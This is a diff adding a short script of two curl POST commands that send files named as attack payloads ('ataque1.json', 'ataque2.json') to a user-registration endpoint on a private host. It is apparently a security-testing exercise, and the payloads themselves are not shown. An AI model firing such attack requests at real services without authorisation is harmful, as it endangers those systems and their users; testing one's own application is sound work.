@@ -1,0 +1,7 @@
+curl -X POST http://kmarx.falcon-notothen.ts.net:5000/cadastrar-usuario \
+  -H "Content-Type: application/json" \
+  --data @ataque1.json
+
+curl -X POST http://kmarx.falcon-notothen.ts.net:5000/cadastrar-usuario \
+  -H "Content-Type: application/json" \
+  --data @ataque2.json
